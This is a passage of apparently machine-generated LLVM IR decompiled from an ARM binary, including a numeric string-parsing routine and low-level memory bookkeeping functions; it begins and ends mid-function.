  br i1 %v9_129dc, label %dec_label_pc_129e8, label %dec_label_pc_129e4

dec_label_pc_129e4:                               ; preds = %dec_label_pc_129c4, %dec_label_pc_12980, %dec_label_pc_12964, %dec_label_pc_129d8
  %v0_129e4 = call i32 @function_12b24()
  store i32 %v0_129e4, i32* %r0.global-to-local, align 4
  %v0_129e8.pre = load i32, i32* @r1, align 4
  %v1_129e8.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_129e8

dec_label_pc_129e8:                               ; preds = %dec_label_pc_129d8, %dec_label_pc_129e4
  %v1_129e8 = phi i32 [ %v3_129d0, %dec_label_pc_129d8 ], [ %v1_129e8.pre, %dec_label_pc_129e4 ]
  %v0_129e8 = phi i32 [ %v3_129c4, %dec_label_pc_129d8 ], [ %v0_129e8.pre, %dec_label_pc_129e4 ]
  %v2_129e8 = add i32 %v1_129e8, 8
  %v3_129e8 = inttoptr i32 %v2_129e8 to i32*
  store i32 %v0_129e8, i32* %v3_129e8, align 4
  %v0_129ec = load i32, i32* %r2.global-to-local, align 4
  %v1_129ec = load i32, i32* %r1.global-to-local, align 4
  %v2_129ec = add i32 %v1_129ec, 12
  %v3_129ec = inttoptr i32 %v2_129ec to i32*
  store i32 %v0_129ec, i32* %v3_129ec, align 4
  %v0_129f0 = load i32, i32* %ip.global-to-local, align 4
  %v1_129f0 = load i32, i32* %r0.global-to-local, align 4
  %v2_129f0 = add i32 %v1_129f0, %v0_129f0
  store i32 %v2_129f0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_129f4

dec_label_pc_129f4:                               ; preds = %dec_label_pc_129b0.dec_label_pc_129f4_crit_edge, %dec_label_pc_129e8
  %v0_12a04 = phi i32 [ %v0_12a04.pre, %dec_label_pc_129b0.dec_label_pc_129f4_crit_edge ], [ %v2_129f0, %dec_label_pc_129e8 ]
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_129f8 = load i32, i32* @r7, align 4
  %v2_129f8 = add i32 %v0_129f8, 32
  %v3_129f8 = inttoptr i32 %v2_129f8 to i32*
  %v4_129f8 = load i32, i32* %v3_129f8, align 4
  %v1_129fc = add i32 %v4_129f8, 52
  store i32 %v1_129fc, i32* %r3.global-to-local, align 4
  %v1_12a00 = add i32 %v4_129f8, 60
  %v2_12a00 = inttoptr i32 %v1_12a00 to i32*
  %v3_12a00 = load i32, i32* %v2_12a00, align 4
  store i32 %v3_12a00, i32* %r1.global-to-local, align 4
  %v1_12a04 = or i32 %v0_12a04, 1
  store i32 %v1_12a04, i32* %r2.global-to-local, align 4
  %v1_12a08 = load i32, i32* %r4.global-to-local, align 4
  %v2_12a08 = add i32 %v1_12a08, 12
  %v3_12a08 = inttoptr i32 %v2_12a08 to i32*
  store i32 %v1_129fc, i32* %v3_12a08, align 4
  %v0_12a0c = load i32, i32* %r1.global-to-local, align 4
  %v1_12a0c = load i32, i32* %r4.global-to-local, align 4
  %v2_12a0c = add i32 %v1_12a0c, 8
  %v3_12a0c = inttoptr i32 %v2_12a0c to i32*
  store i32 %v0_12a0c, i32* %v3_12a0c, align 4
  %v0_12a10 = load i32, i32* %r2.global-to-local, align 4
  %v1_12a10 = load i32, i32* %r4.global-to-local, align 4
  %v2_12a10 = add i32 %v1_12a10, 4
  %v3_12a10 = inttoptr i32 %v2_12a10 to i32*
  store i32 %v0_12a10, i32* %v3_12a10, align 4
  %v0_12a14 = load i32, i32* %ip.global-to-local, align 4
  %v1_12a14 = load i32, i32* %r4.global-to-local, align 4
  %v3_12a14 = add i32 %v1_12a14, %v0_12a14
  %v4_12a14 = inttoptr i32 %v3_12a14 to i32*
  store i32 %v0_12a14, i32* %v4_12a14, align 4
  %v0_12a18 = load i32, i32* %r4.global-to-local, align 4
  %v1_12a18 = load i32, i32* %r1.global-to-local, align 4
  %v2_12a18 = add i32 %v1_12a18, 12
  %v3_12a18 = inttoptr i32 %v2_12a18 to i32*
  store i32 %v0_12a18, i32* %v3_12a18, align 4
  %v0_12a1c = load i32, i32* %r4.global-to-local, align 4
  %v1_12a1c = load i32, i32* %r3.global-to-local, align 4
  %v2_12a1c = add i32 %v1_12a1c, 8
  %v3_12a1c = inttoptr i32 %v2_12a1c to i32*
  store i32 %v0_12a1c, i32* %v3_12a1c, align 4
  br label %dec_label_pc_12a34

dec_label_pc_12a24:                               ; preds = %dec_label_pc_12998
  %v2_12a24 = add i32 %v1_129a8, %v0_12a24
  store i32 %v2_12a24, i32* %ip.global-to-local, align 4
  %v1_12a28 = or i32 %v2_12a24, 1
  store i32 %v1_12a28, i32* %r3.global-to-local, align 4
  %v0_12a2c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12a2c, i32* %v2_129a0, align 4
  %v0_12a30 = load i32, i32* %r3.global-to-local, align 4
  %v1_12a30 = load i32, i32* %r4.global-to-local, align 4
  %v2_12a30 = add i32 %v1_12a30, 4
  %v3_12a30 = inttoptr i32 %v2_12a30 to i32*
  store i32 %v0_12a30, i32* %v3_12a30, align 4
  br label %dec_label_pc_12a34

dec_label_pc_12a34:                               ; preds = %dec_label_pc_129f4, %dec_label_pc_12a24
  %v0_12a34 = load i32, i32* %ip.global-to-local, align 4
  %v3_12a38 = icmp ult i32 %v0_12a34, 131070
  br i1 %v3_12a38, label %dec_label_pc_12aa4, label %dec_label_pc_12a3c

dec_label_pc_12a3c:                               ; preds = %dec_label_pc_12a34
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_12a40 = load i32, i32* @r7, align 4
  %v2_12a40 = add i32 %v0_12a40, 32
  %v3_12a40 = inttoptr i32 %v2_12a40 to i32*
  %v4_12a40 = load i32, i32* %v3_12a40, align 4
  store i32 %v4_12a40, i32* @r4, align 4
  %v1_12a44 = inttoptr i32 %v4_12a40 to i32*
  %v2_12a44 = load i32, i32* %v1_12a44, align 4
  store i32 %v2_12a44, i32* %r3.global-to-local, align 4
  %v1_12a48 = and i32 %v2_12a44, 2
  %v2_12a48 = icmp eq i32 %v1_12a48, 0
  br i1 %v2_12a48, label %bb15, label %bb

bb:                                               ; preds = %dec_label_pc_12a3c
  store i32 %v4_12a40, i32* %r0.global-to-local, align 4
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_12a3c, %bb
  store i32 76372, i32* @lr, align 4
  %v1_12a50 = xor i1 %v2_12a48, true
  call void @__pseudo_cond_branch(i1 %v1_12a50, i32 ptrtoint (i32* @global_var_126f4.401 to i32))
  %v0_12a54 = load i32, i32* @r4, align 4
  %v1_12a54 = add i32 %v0_12a54, 44
  %v2_12a54 = inttoptr i32 %v1_12a54 to i32*
  %v3_12a54 = load i32, i32* %v2_12a54, align 4
  store i32 %v3_12a54, i32* %r3.global-to-local, align 4
  %v1_12a58 = add i32 %v3_12a54, 4
  %v2_12a58 = inttoptr i32 %v1_12a58 to i32*
  %v3_12a58 = load i32, i32* %v2_12a58, align 4
  store i32 %v3_12a58, i32* %r3.global-to-local, align 4
  %v1_12a5c = add i32 %v0_12a54, 836
  %v2_12a5c = inttoptr i32 %v1_12a5c to i32*
  %v3_12a5c = load i32, i32* %v2_12a5c, align 4
  store i32 %v3_12a5c, i32* %r2.global-to-local, align 4
  %v1_12a60 = and i32 %v3_12a58, -4
  store i32 %v1_12a60, i32* %r3.global-to-local, align 4
  %v3_12a64 = icmp ult i32 %v1_12a60, %v3_12a5c
  br i1 %v3_12a64, label %dec_label_pc_12aa4, label %dec_label_pc_12a6c

dec_label_pc_12a6c:                               ; preds = %bb15
  store i32 %v0_12a54, i32* %r1.global-to-local, align 4
  %v1_12a70 = add i32 %v0_12a54, 840
  %v2_12a70 = inttoptr i32 %v1_12a70 to i32*
  %v3_12a70 = load i32, i32* %v2_12a70, align 4
  store i32 %v3_12a70, i32* %r0.global-to-local, align 4
  %v2_12a74 = call i32 @function_12644(i32 %v3_12a70, i32 %v0_12a54)
  store i32 %v2_12a74, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12aa4

dec_label_pc_12a7c:                               ; preds = %dec_label_pc_12940
  %v2_12a7c = inttoptr i32 %v1_12910 to i32*
  %v3_12a7c = load i32, i32* %v2_12a7c, align 4
  store i32 %v3_12a7c, i32* %r0.global-to-local, align 4
  %v1_12a80 = add i32 %v4_12900, 848
  %v2_12a80 = inttoptr i32 %v1_12a80 to i32*
  %v3_12a80 = load i32, i32* %v2_12a80, align 4
  store i32 %v3_12a80, i32* %r2.global-to-local, align 4
  %v1_12a84 = add i32 %v4_12900, 868
  %v2_12a84 = inttoptr i32 %v1_12a84 to i32*
  %v3_12a84 = load i32, i32* %v2_12a84, align 4
  %v2_12a88 = add i32 %v3_12a7c, %v1_1290c
  store i32 %v2_12a88, i32* %r1.global-to-local, align 4
  %v1_12a8c = add i32 %v3_12a80, -1
  store i32 %v1_12a8c, i32* %r2.global-to-local, align 4
  %v2_12a90 = sub i32 %v3_12a84, %v2_12a88
  store i32 %v2_12a90, i32* %r3.global-to-local, align 4
  store i32 %v2_12a90, i32* %v2_12a84, align 4
  %v1_12a98 = load i32, i32* @lr, align 4
  %v2_12a98 = add i32 %v1_12a98, 848
  %v3_12a98 = inttoptr i32 %v2_12a98 to i32*
  store i32 %v1_12a8c, i32* %v3_12a98, align 4
  %v0_12a9c = load i32, i32* %r0.global-to-local, align 4
  %v1_12a9c = load i32, i32* @r5, align 4
  %v2_12a9c = sub i32 %v1_12a9c, %v0_12a9c
  store i32 %v2_12a9c, i32* %r0.global-to-local, align 4
  %v4_12aa0 = call i32 @function_1408c(i32 %v2_12a9c, i32 %v2_12a88, i32 %v1_12a8c, i32 %v2_12a90)
  store i32 %v4_12aa0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12aa4

dec_label_pc_12aa4:                               ; preds = %bb15, %dec_label_pc_12a34, %dec_label_pc_12a6c, %dec_label_pc_12920, %dec_label_pc_12a7c
  store i32 %v2_128b4, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v0_12ab0 = load i32, i32* @r7, align 4
  %v2_12ab0 = add i32 %v0_12ab0, 24
  %v3_12ab0 = inttoptr i32 %v2_12ab0 to i32*
  %v4_12ab0 = load i32, i32* %v3_12ab0, align 4
  store i32 %v4_12ab0, i32* @ip, align 4
  store i32 76476, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_12ab0)
  br label %dec_label_pc_12abc

dec_label_pc_12abc:                               ; preds = %dec_label_pc_128a8, %dec_label_pc_12aa4
  store i32 %v3_128a8, i32* @r4, align 4
  store i32 %v6_128a8, i32* @r5, align 4
  store i32 %v9_128a8, i32* @r6, align 4
  store i32 %v12_128a8, i32* @r7, align 4
  store i32 %v18_128a8, i32* @lr, align 4
  ret i32 %v2_128b4

; uselistorder directives
  uselistorder i32 %v0_12a54, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_12a14, { 1, 0 }
  uselistorder i32 %v1_12954, { 1, 0 }
  uselistorder i32 %v0_12954, { 1, 0 }
  uselistorder i32 %v3_12928, { 1, 0 }
  uselistorder i32 %v1_1290c, { 1, 0, 2 }
  uselistorder i32 %v2_12908, { 1, 2, 0, 3 }
  uselistorder i32 %v4_12900, { 1, 0, 2, 3 }
  uselistorder i32 %v0_128b0, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %r0.global-to-local, { 4, 10, 1, 2, 3, 0, 5, 6, 8, 9, 7, 11, 12, 14, 13 }
  uselistorder i32* %lr.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 4, 0, 5, 1, 6, 3, 2, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 868, { 2, 0, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_12abc, { 1, 0 }
  uselistorder label %dec_label_pc_12aa4, { 4, 2, 0, 1, 3 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %dec_label_pc_12a34, { 1, 0 }
  uselistorder label %dec_label_pc_129f4, { 1, 0 }
  uselistorder label %dec_label_pc_129e8, { 1, 0 }
  uselistorder label %dec_label_pc_129e4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_12998, { 1, 0 }
}

define i32 @function_12acc(i32 %arg1) local_unnamed_addr {
dec_label_pc_12acc:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_12acc = load i1, i1* @cpsr_z, align 1
  %v2_12acc = load i32, i32* @r4, align 4
  br i1 %v0_12acc, label %bb, label %dec_label_pc_12acc..thread4_crit_edge

dec_label_pc_12acc..thread4_crit_edge:            ; preds = %dec_label_pc_12acc
  %v0_12af8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread4

bb:                                               ; preds = %dec_label_pc_12acc
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_12acc..thread4_crit_edge, %bb
  %v0_12af8 = phi i32 [ %v0_12af8.pre, %dec_label_pc_12acc..thread4_crit_edge ], [ 0, %bb ]
  store i32 %v2_12acc, i32* %stack_var_-12, align 4
  %v6_12ae4 = load i32, i32* @r5, align 4
  %v9_12ae4 = load i32, i32* @lr, align 4
  %v4_12af4 = load i32, i32* inttoptr (i32 124852 to i32*), align 4
  store i32 %v4_12af4, i32* @r5, align 4
  store i32 %v0_12af8, i32* @r4, align 4
  store i32 %v4_12af4, i32* @r0, align 4
  %v0_12b04 = call i32 @function_126f4()
  %v0_12b08 = load i32, i32* @r4, align 4
  store i32 %v0_12b08, i32* %r0.global-to-local, align 4
  %v0_12b0c = load i32, i32* @r5, align 4
  %v2_12b14 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_12b14, i32* @r4, align 4
  store i32 %v6_12ae4, i32* @r5, align 4
  store i32 %v9_12ae4, i32* @lr, align 4
  %v2_12b18 = call i32 @function_12644(i32 %v0_12b08, i32 %v0_12b0c)
  store i32 %v2_12b18, i32* %r0.global-to-local, align 4
  %v0_12b1c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12b1c, label %bb13, label %.thread5

bb13:                                             ; preds = %.thread4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread5

.thread5:                                         ; preds = %.thread4, %bb13
  %v4_12b20 = phi i32 [ %v2_12b18, %.thread4 ], [ 0, %bb13 ]
  ret i32 %v4_12b20

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 5, 3, 4, 0, 1 }
  uselistorder i32 (i32, i32)* @function_12644, { 1, 0 }
  uselistorder i32 ()* @function_126f4, { 3, 2, 1, 0 }
  uselistorder i32* inttoptr (i32 124852 to i32*), { 15, 5, 6, 7, 8, 9, 4, 10, 3, 11, 0, 12, 13, 2, 14, 1 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @function_12b24() local_unnamed_addr {
dec_label_pc_12b24:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 124820, i32* @r5, align 4
  %v4_12b3c = load i32, i32* inttoptr (i32 124836 to i32*), align 4
  store i32 76616, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_12b3c)
  %v2_12b58 = ptrtoint i32* %stack_var_-8 to i32
  store i32 32, i32* %stack_var_-8, align 4
  %v3_12b64 = call i32 @function_10da4(i32 1, i32 %v2_12b58, i32 0)
  %v4_12b6c = load i32, i32* @global_var_1ea2c.409, align 4
  %v2_12b70 = icmp eq i32 %v4_12b6c, 0
  br i1 %v2_12b70, label %dec_label_pc_12b78, label %dec_label_pc_12bb8

dec_label_pc_12b78:                               ; preds = %dec_label_pc_12b24
  store i32 1, i32* @global_var_1ea2c.409, align 4
  br label %dec_label_pc_12b80

dec_label_pc_12b80:                               ; preds = %dec_label_pc_12bc8, %dec_label_pc_12b78
  %v0_12b84 = load i32, i32* @r5, align 4
  %v2_12b84 = add i32 %v0_12b84, 160
  store i32 %v2_12b84, i32* @r4, align 4
  %v2_12b90 = add i32 %v0_12b84, 36
  %v3_12b90 = inttoptr i32 %v2_12b90 to i32*
  %v4_12b90 = load i32, i32* %v3_12b90, align 4
  call void @__pseudo_branch(i32 %v4_12b90)
  %v1_12ba0 = call i32 @function_1162c(i32 6)
  %v0_12bac = load i32, i32* @r5, align 4
  %v2_12bac = add i32 %v0_12bac, 16
  %v3_12bac = inttoptr i32 %v2_12bac to i32*
  %v4_12bac = load i32, i32* %v3_12bac, align 4
  store i32 76728, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_12bac)
  %v4_12bbc.pre = load i32, i32* @global_var_1ea2c.409, align 4
  br label %dec_label_pc_12bb8

dec_label_pc_12bb8:                               ; preds = %dec_label_pc_12b24, %dec_label_pc_12b80
  %v0_12bcc = phi i32 [ %v4_12b6c, %dec_label_pc_12b24 ], [ %v4_12bbc.pre, %dec_label_pc_12b80 ]
  %v7_12bc0 = icmp eq i32 %v0_12bcc, 1
  br i1 %v7_12bc0, label %dec_label_pc_12bc8, label %dec_label_pc_12c04

dec_label_pc_12bc8:                               ; preds = %dec_label_pc_12bb8
  %v2_12bc8 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_12bc8, i32* @r4, align 4
  store i32 2, i32* @global_var_1ea2c.409, align 4
  store i32 20, i32* @r2, align 4
  %v2_12be0 = bitcast i32* %stack_var_-28 to i8*
  %v3_12be0 = call i32 @function_11260(i8* %v2_12be0, i32 0)
  %v3_12bfc = call i32 @function_13b8c(i32 6, i32 %v2_12bc8, i32 0)
  br label %dec_label_pc_12b80

dec_label_pc_12c04:                               ; preds = %dec_label_pc_12bb8
  %v7_12c04 = icmp eq i32 %v0_12bcc, 2
  br i1 %v7_12c04, label %dec_label_pc_12c0c, label %dec_label_pc_12c18

dec_label_pc_12c0c:                               ; preds = %dec_label_pc_12c04
  store i32 3, i32* @global_var_1ea2c.409, align 4
  %v0_12c14 = call i32 @function_12b24()
  %v4_12c18.pre = load i32, i32* @global_var_1ea2c.409, align 4
  br label %dec_label_pc_12c18

dec_label_pc_12c18:                               ; preds = %dec_label_pc_12c04, %dec_label_pc_12c0c
  %v1_12c20 = phi i32 [ %v0_12bcc, %dec_label_pc_12c04 ], [ %v4_12c18.pre, %dec_label_pc_12c0c ]
  %v7_12c1c = icmp eq i32 %v1_12c20, 3
  br i1 %v7_12c1c, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_12c18
  store i32 4, i32* @global_var_1ea2c.409, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_12c18, %bb
  call void @__pseudo_cond_branch(i1 %v7_12c1c, i32 ptrtoint (i32* @global_var_1417c.411 to i32))
  br label %dec_label_pc_12c30

dec_label_pc_12c30:                               ; preds = %dec_label_pc_12c30, %.thread1
  %v0_12c30 = call i32 @function_12b24()
  br label %dec_label_pc_12c30

; uselistorder directives
  uselistorder i32 ()* @function_12b24, { 2, 1, 6, 0, 4, 5, 3 }
  uselistorder i32 6, { 14, 15, 68, 3, 31, 32, 17, 27, 18, 28, 19, 29, 16, 30, 1, 33, 20, 34, 0, 4, 35, 36, 37, 5, 38, 39, 40, 41, 6, 42, 43, 44, 45, 7, 46, 8, 47, 48, 21, 49, 9, 50, 51, 52, 22, 53, 10, 54, 55, 56, 23, 57, 58, 59, 24, 60, 11, 61, 62, 63, 64, 25, 65, 12, 66, 69, 70, 71, 72, 73, 26, 74, 13, 75, 2, 67 }
  uselistorder i32* @global_var_1ea2c.409, { 2, 0, 3, 4, 1, 5, 6 }
  uselistorder i32* inttoptr (i32 124836 to i32*), { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_12c18, { 1, 0 }
  uselistorder label %dec_label_pc_12bb8, { 1, 0 }
}

define i32 @function_12c3c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12c3c:
  %v0_12c3c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12c3c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_12c3c
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_12c3c, %bb
  %v4_12c48 = phi i32 [ %arg1, %dec_label_pc_12c3c ], [ 0, %bb ]
  ret i32 %v4_12c48

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_12c4c(i32 %arg1) local_unnamed_addr {
dec_label_pc_12c4c:
  store i32 0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_12c5c = call i32 @function_12c6c()
  ret i32 %v0_12c5c
}

define i32 @function_12c6c() local_unnamed_addr {
dec_label_pc_12c6c:
  store i32 1, i32* @r3, align 4
  %v0_12c78 = call i32 @function_12c88()
  ret i32 %v0_12c78
}

define i32 @function_12c88() local_unnamed_addr {
dec_label_pc_12c88:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %v3_12c88 = load i32, i32* @r4, align 4
  store i32 224, i32* @lr, align 4
  store i32 124820, i32* %ip.global-to-local, align 4
  %v0_12c9c = load i32, i32* @r1, align 4
  store i32 %v0_12c9c, i32* %fp.global-to-local, align 4
  %v0_12ca0 = load i32, i32* @r2, align 4
  store i32 %v0_12ca0, i32* %r5.global-to-local, align 4
  %v0_12ca4 = load i32, i32* @r0, align 4
  store i32 %v0_12ca4, i32* @r4, align 4
  %v0_12ca8 = load i32, i32* @r3, align 4
  br label %dec_label_pc_12cb4

dec_label_pc_12cb0:                               ; preds = %dec_label_pc_12cb4
  %v1_12cb0 = add i32 %v0_12cec, 1
  store i32 %v1_12cb0, i32* @r4, align 4
  br label %dec_label_pc_12cb4

dec_label_pc_12cb4:                               ; preds = %dec_label_pc_12c88, %dec_label_pc_12cb0
  %v0_12cec = phi i32 [ %v0_12ca4, %dec_label_pc_12c88 ], [ %v1_12cb0, %dec_label_pc_12cb0 ]
  %v1_12cb4 = inttoptr i32 %v0_12cec to i8*
  %v2_12cb4 = load i8, i8* %v1_12cb4, align 1
  %v3_12cb4 = zext i8 %v2_12cb4 to i32
  %v4_12cb8 = load i32, i32* inttoptr (i32 125044 to i32*), align 4
  %v2_12cbc = mul nuw nsw i32 %v3_12cb4, 2
  %v2_12cc0 = add i32 %v2_12cbc, %v4_12cb8
  %v3_12cc0 = inttoptr i32 %v2_12cc0 to i16*
  %v4_12cc0 = load i16, i16* %v3_12cc0, align 2
  %v1_12cc4 = and i16 %v4_12cc0, 32
  %v2_12cc4 = icmp eq i16 %v1_12cc4, 0
  br i1 %v2_12cc4, label %dec_label_pc_12ccc, label %dec_label_pc_12cb0

dec_label_pc_12ccc:                               ; preds = %dec_label_pc_12cb4
  %v7_12ccc = icmp eq i8 %v2_12cb4, 43
  br i1 %v7_12ccc, label %dec_label_pc_12cec, label %dec_label_pc_12cd4

dec_label_pc_12cd4:                               ; preds = %dec_label_pc_12ccc
  %v7_12cd4 = icmp eq i8 %v2_12cb4, 45
  br i1 %v7_12cd4, label %dec_label_pc_12cec, label %bb

bb:                                               ; preds = %dec_label_pc_12cd4
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_12cf0

dec_label_pc_12cec:                               ; preds = %dec_label_pc_12ccc, %dec_label_pc_12cd4
  %storemerge39 = phi i32 [ 1, %dec_label_pc_12cd4 ], [ 0, %dec_label_pc_12ccc ]
  store i32 %storemerge39, i32* @r7, align 4
  %v1_12cec = add i32 %v0_12cec, 1
  store i32 %v1_12cec, i32* @r4, align 4
  br label %dec_label_pc_12cf0

dec_label_pc_12cf0:                               ; preds = %bb, %dec_label_pc_12cec
  %v0_12d10 = phi i32 [ %v0_12cec, %bb ], [ %v1_12cec, %dec_label_pc_12cec ]
  %v1_12cf0 = and i32 %v0_12ca0, -17
  %v3_12cf0 = icmp eq i32 %v1_12cf0, 0
  br i1 %v3_12cf0, label %dec_label_pc_12cfc, label %bb52

bb52:                                             ; preds = %dec_label_pc_12cf0
  store i32 %v0_12ca4, i32* %r6.global-to-local, align 4
  br label %bb56

dec_label_pc_12cfc:                               ; preds = %dec_label_pc_12cf0
  %v1_12cfc = inttoptr i32 %v0_12d10 to i8*
  %v2_12cfc = load i8, i8* %v1_12cfc, align 1
  %v7_12d00 = icmp eq i8 %v2_12cfc, 48
  %v1_12d04 = add i32 %v0_12ca0, 10
  store i32 %v1_12d04, i32* %r5.global-to-local, align 4
  br i1 %v7_12d00, label %dec_label_pc_12d10, label %bb53

bb53:                                             ; preds = %dec_label_pc_12cfc
  store i32 %v0_12ca4, i32* %r6.global-to-local, align 4
  br label %.thread8

dec_label_pc_12d10:                               ; preds = %dec_label_pc_12cfc
  %v1_12d10 = add i32 %v0_12d10, 1
  %v2_12d10 = inttoptr i32 %v1_12d10 to i8*
  %v3_12d10 = load i8, i8* %v2_12d10, align 1
  %v4_12d10 = zext i8 %v3_12d10 to i32
  store i32 %v1_12d10, i32* @r4, align 4
  %v1_12d14 = or i32 %v4_12d10, 32
  %v7_12d18 = icmp eq i32 %v1_12d14, 120
  %v1_12d1c = add i32 %v0_12ca0, 8
  store i32 %v1_12d1c, i32* %r5.global-to-local, align 4
  store i32 %v1_12d10, i32* %r6.global-to-local, align 4
  br i1 %v7_12d18, label %bb54, label %.thread8

bb54:                                             ; preds = %dec_label_pc_12d10
  %v3_12d28 = mul i32 %v1_12d1c, 2
  store i32 %v3_12d28, i32* %r5.global-to-local, align 4
  %v2_12d2c = add i32 %v0_12d10, 2
  store i32 %v2_12d2c, i32* @r4, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_12d10, %bb53, %bb54
  %v0_12d30 = phi i32 [ %v1_12d04, %bb53 ], [ %v3_12d28, %bb54 ], [ %v1_12d1c, %dec_label_pc_12d10 ]
  %v5_12d34 = icmp slt i32 %v0_12d30, 16
  br i1 %v5_12d34, label %bb56, label %bb55

bb55:                                             ; preds = %.thread8
  store i32 16, i32* %r5.global-to-local, align 4
  br label %bb56

bb56:                                             ; preds = %bb52, %.thread8, %bb55
  %v0_12d4c = phi i32 [ %v0_12ca0, %bb52 ], [ %v0_12d30, %.thread8 ], [ 16, %bb55 ]
  %v1_12d38 = add i32 %v0_12d4c, -2
  %tmp = icmp ugt i32 %v1_12d38, 34
  br i1 %tmp, label %.thread, label %dec_label_pc_12d48

.thread:                                          ; preds = %bb56
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12df4

dec_label_pc_12d48:                               ; preds = %bb56
  %v2_12d50 = call i32 @function_10974(i32 -1, i32 %v0_12d4c)
  store i32 -1, i32* @r0, align 4
  %v0_12d5c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12d5c, i32* @r1, align 4
  %v1_12d60 = urem i32 %v0_12d4c, 256
  store i32 %v1_12d60, i32* %sl.global-to-local, align 4
  %v0_12d64 = call i32 @function_10878()
  store i32 -1, i32* %sb.global-to-local, align 4
  store i32 %v0_12d64, i32* %r8.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_12d7c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12d7c

dec_label_pc_12d78:                               ; preds = %bb63, %dec_label_pc_12dd8
  %v0_12d78 = phi i32 [ %v1_12db836, %bb63 ], [ %v0_12d78.pre, %dec_label_pc_12dd8 ]
  store i32 %v0_12d78, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12d7c

dec_label_pc_12d7c:                               ; preds = %dec_label_pc_12d48, %dec_label_pc_12d78
  %v0_12db8 = phi i32 [ %v0_12d7c.pre, %dec_label_pc_12d48 ], [ %v0_12d78, %dec_label_pc_12d78 ]
  %v1_12d7c = inttoptr i32 %v0_12db8 to i8*
  %v2_12d7c = load i8, i8* %v1_12d7c, align 1
  %v3_12d7c = zext i8 %v2_12d7c to i32
  %v1_12d80 = add nsw i32 %v3_12d7c, -48
  %v1_12d84 = urem i32 %v1_12d80, 256
  %v1_12d8c = or i32 %v3_12d7c, 32
  %tmp71 = icmp ult i32 %v1_12d84, 10
  br i1 %tmp71, label %bb58, label %dec_label_pc_12d94

dec_label_pc_12d94:                               ; preds = %dec_label_pc_12d7c
  %tmp72 = icmp ugt i32 %v1_12d8c, 96
  br i1 %tmp72, label %bb57, label %bb58

bb57:                                             ; preds = %dec_label_pc_12d94
  %v1_12d98 = add nsw i32 %v1_12d8c, -87
  %v5_12da0 = urem i32 %v1_12d98, 256
  br label %bb58

bb58:                                             ; preds = %dec_label_pc_12d7c, %dec_label_pc_12d94, %bb57
  %v3_12dd0 = phi i32 [ %v1_12d84, %dec_label_pc_12d7c ], [ 40, %dec_label_pc_12d94 ], [ %v5_12da0, %bb57 ]
  %v1_12da4 = load i32, i32* %r5.global-to-local, align 4
  %v6_12da8 = icmp slt i32 %v3_12dd0, %v1_12da4
  br i1 %v6_12da8, label %dec_label_pc_12dac, label %dec_label_pc_12df4.loopexit

dec_label_pc_12dac:                               ; preds = %bb58
  %v0_12dac = load i32, i32* %ip.global-to-local, align 4
  %v1_12dac = load i32, i32* %r8.global-to-local, align 4
  %v9_12dac = icmp eq i32 %v0_12dac, %v1_12dac
  br i1 %v9_12dac, label %.thread31, label %bb59

.thread31:                                        ; preds = %dec_label_pc_12dac
  %v1_12db832 = add i32 %v0_12db8, 1
